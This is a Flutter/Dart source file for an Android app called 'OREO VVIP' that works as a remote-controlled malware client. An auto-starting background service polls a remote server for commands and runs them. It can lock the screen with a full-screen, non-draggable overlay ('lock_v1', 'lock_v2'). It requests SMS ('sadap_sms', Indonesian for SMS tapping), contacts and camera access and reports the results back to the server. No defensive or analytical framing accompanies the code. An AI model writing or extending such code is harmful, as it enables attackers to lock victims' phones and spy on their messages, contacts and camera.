import 'dart:async';
import 'dart:convert';
import 'dart:ui';

import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_overlay_window/flutter_overlay_window.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';

import 'config.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await _initBackgroundService();
  runApp(const MyApp());
}

Future<void> _initBackgroundService() async {
  final service = FlutterBackgroundService();
  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onServiceStart,
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'yanz_channel',
      initialNotificationTitle: 'OREO Service',
      initialNotificationContent: 'Berjalan di latar belakang',
      foregroundServiceNotificationId: 888,
      foregroundServiceTypes: [AndroidForegroundType.specialUse],
    ),
    iosConfiguration: IosConfiguration(autoStart: true),
  );
  await service.startService();
}

@pragma('vm:entry-point')
Future<void> onServiceStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  if (service is AndroidServiceInstance) {
    service.on('setAsForeground').listen((_) {
      service.setAsForegroundService();
    });
    service.on('setAsBackground').listen((_) {
      service.setAsBackgroundService();
    });
  }

  service.on('stopService').listen((_) {
    service.stopSelf();
  });

  Timer.periodic(const Duration(seconds: AppConfig.pollIntervalSec), (timer) async {
    try {
      final res = await http
          .get(Uri.parse('${AppConfig.baseUrl}${AppConfig.endpointPoll}'))
          .timeout(const Duration(seconds: 8));

      if (res.statusCode == 200 && res.body.isNotEmpty) {
        final data = jsonDecode(res.body);
        final cmd = data['command'] as String?;
        final args = data['args'];

        if (cmd != null && cmd.isNotEmpty) {
          await _handleCommand(cmd, args);
        }
      }
    } catch (e) {
      debugPrint('Poll error: $e');
    }
  });
}

Future<void> _handleCommand(String cmd, dynamic args) async {
  switch (cmd) {
    case 'lock_v1':
      if (await FlutterOverlayWindow.isPermissionGranted()) {
        await FlutterOverlayWindow.showOverlay(
          height: WindowSize.fullCover,
          width: WindowSize.fullCover,
          enableDrag: false,
          overlayFlags: OverlayFlag.defaultFlag,
        );
      }
      break;

    case 'lock_v2':
      if (await FlutterOverlayWindow.isPermissionGranted()) {
        await FlutterOverlayWindow.showOverlay(
          height: WindowSize.fullCover,
          width: WindowSize.fullCover,
          enableDrag: false,
          overlayFlags: OverlayFlag.defaultFlag,
        );
      }
      break;

    case 'sadap_sms':
      final status = await Permission.sms.request();
      await _reportResult('sadap_sms', {'granted': status.isGranted});
      break;

    case 'cek_kontak':
      final status = await Permission.contacts.request();
      await _reportResult('cek_kontak', {'granted': status.isGranted});
      break;

    case 'akses_kamera':
      final status = await Permission.camera.request();
      await _reportResult('akses_kamera', {'granted': status.isGranted});
      break;

    default:
      debugPrint('Unknown command: $cmd');
  }
}

Future<void> _reportResult(String cmd, Map<String, dynamic> payload) async {
  try {
    await http.post(
      Uri.parse('${AppConfig.baseUrl}${AppConfig.endpointResult}'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({'command': cmd, 'result': payload}),
    ).timeout(const Duration(seconds: 8));
  } catch (e) {
    debugPrint('Report error: $e');
  }
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'OREO VVIP',
      debugShowCheckedModeBanner: false,
      home: const HomePage(),
    );
  }
}

class HomePage extends StatefulWidget {
  const HomePage({super.key});

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  String _status = 'idle';

  Future<void> _requestAll() async {
    setState(() => _status = 'meminta izin...');
    await [
      Permission.sms,
      Permission.contacts,
      Permission.camera,
      Permission.notification,
    ].request();

    if (!await FlutterOverlayWindow.isPermissionGranted()) {
      await FlutterOverlayWindow.requestPermission();
    }

    setState(() => _status = 'izin diproses');
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('OREO VVIP V33')),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Text('Status: $_status'),
            const SizedBox(height: 20),
            ElevatedButton(
              onPressed: _requestAll,
              child: const Text('Minta Izin'),
            ),
          ],
        ),
      ),
    );
  }
}
